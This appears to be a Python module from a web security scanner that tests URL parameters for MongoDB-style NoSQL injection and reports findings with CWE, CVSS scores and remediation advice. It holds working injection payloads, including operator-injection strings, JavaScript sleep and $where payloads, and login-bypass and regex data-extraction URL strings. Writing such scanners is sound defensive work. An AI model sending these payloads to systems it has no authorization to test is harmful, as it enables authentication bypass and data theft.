# scanner/injection/nosqli.py
"""NoSQL Injection Scanner"""

import re
import json
from typing import List, Dict, Optional
import aiohttp

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class NoSQLInjectionScanner(BaseScanner):
    """Scanner for NoSQL Injection vulnerabilities (MongoDB, etc.)"""
    
    name = "NoSQL Injection Scanner"
    description = "Detects NoSQL injection vulnerabilities"
    owasp_category = OWASPCategory.A03_INJECTION
    
    # MongoDB injection payloads
    MONGO_PAYLOADS = [
        # Operator injection
        ('{"$gt": ""}', 'operator'),
        ('{"$ne": null}', 'operator'),
        ('{"$ne": ""}', 'operator'),
        ('{"$regex": ".*"}', 'operator'),
        ('{"$where": "1==1"}', 'operator'),
        ('{"$or": [{}]}', 'operator'),
        
        # String payloads
        ("' || '1'=='1", 'string'),
        ('"; return true; var foo="', 'string'),
        ("'; return true; var foo='", 'string'),
        
        # Array injection
        ('[$ne]=1', 'array'),
        ('[$gt]=', 'array'),
        ('[$regex]=.*', 'array'),
        
        # JavaScript injection
        ('this.password.match(/.*/)//+%00', 'javascript'),
        ("';sleep(5000);'", 'javascript'),
        ('function(){return true;}', 'javascript'),
    ]
    
    # URL parameter payloads
    URL_PAYLOADS = [
        # Bypass authentication
        ('username[$ne]=admin&password[$ne]=', 'auth_bypass'),
        ('username=admin&password[$ne]=', 'auth_bypass'),
        ('username[$gt]=&password[$gt]=', 'auth_bypass'),
        ('username[$regex]=.*&password[$regex]=.*', 'auth_bypass'),
        
        # Data extraction
        ('username[$regex]=^a', 'extraction'),
        ('username[$regex]=^admin', 'extraction'),
    ]
    
    # Error patterns indicating NoSQL injection
    NOSQL_ERRORS = [
        r'MongoError',
        r'MongoDB',
        r'mongoose',
        r'CastError',
        r'ValidationError.*mongo',
        r'BSON',
        r'\$where',
        r'\$regex',
        r'SyntaxError.*JSON',
        r'Unexpected.*token',
        r'unterminated string',
        r'CouchDB',
        r'RethinkDB',
        r'ArangoDB',
    ]
    
    async def scan(self, session: aiohttp.ClientSession, 
                   url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Scan for NoSQL injection vulnerabilities"""
        vulnerabilities = []
        
        if not params:
            return vulnerabilities
        
        # Get baseline response
        baseline = await self.make_request(session, "GET", url, params=params)
        if not baseline:
            return vulnerabilities
        
        baseline_status = baseline.status
        baseline_body = await baseline.text()
        baseline_length = len(baseline_body)
        
        # Test each parameter with NoSQL payloads
        for param_name, param_value in params.items():
            vuln = await self._test_parameter(
                session, url, params, param_name,
                baseline_status, baseline_body, baseline_length
            )
            if vuln:
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_parameter(self, session: aiohttp.ClientSession,
                               url: str, params: Dict[str, str],
                               param_name: str, baseline_status: int,
                               baseline_body: str, baseline_length: int) -> Optional[Vulnerability]:
        """Test a parameter for NoSQL injection"""
        
        # Test MongoDB operator payloads
        for payload, payload_type in self.MONGO_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            response = await self.make_request(session, "GET", url, params=test_params)
            if not response:
                continue
            
            status = response.status
            body = await response.text()
            
            # Check for NoSQL errors
            for pattern in self.NOSQL_ERRORS:
                if re.search(pattern, body, re.IGNORECASE):
                    return self.create_vulnerability(
                        vuln_type="NoSQL Injection (Error-based)",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"NoSQL error pattern detected: {re.search(pattern, body, re.IGNORECASE).group()[:100]}",
                        description="The application is vulnerable to NoSQL injection. Error messages indicate the input is being processed as a NoSQL query.",
                        cwe_id="CWE-943",
                        cvss_score=9.8,
                        remediation="Sanitize all user inputs. Use parameterized queries or ODM methods. Avoid using $where with user input. Implement input validation.",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                            "https://cwe.mitre.org/data/definitions/943.html"
                        ]
                    )
            
            # Check for authentication bypass
            if payload_type == 'operator':
                if status == 200 and baseline_status != 200:
                    return self.create_vulnerability(
                        vuln_type="NoSQL Injection (Authentication Bypass)",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Status changed from {baseline_status} to {status} with NoSQL operator payload",
                        description="The application may be vulnerable to NoSQL injection allowing authentication bypass.",
                        cwe_id="CWE-943",
                        cvss_score=9.8,
                        remediation="Sanitize all inputs. Never pass user input directly to NoSQL queries. Use proper authentication libraries.",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
                        ]
                    )
                
                # Check for significant response change
                if status == 200 and abs(len(body) - baseline_length) > 100:
                    return self.create_vulnerability(
                        vuln_type="Potential NoSQL Injection",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Response length changed significantly ({baseline_length} -> {len(body)}) with NoSQL operator",
                        description="The application response changed significantly when NoSQL operators were injected, suggesting potential NoSQL injection.",
                        cwe_id="CWE-943",
                        cvss_score=7.5,
                        remediation="Review the application's NoSQL query handling and implement proper input sanitization.",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
                        ]
                    )
        
        return None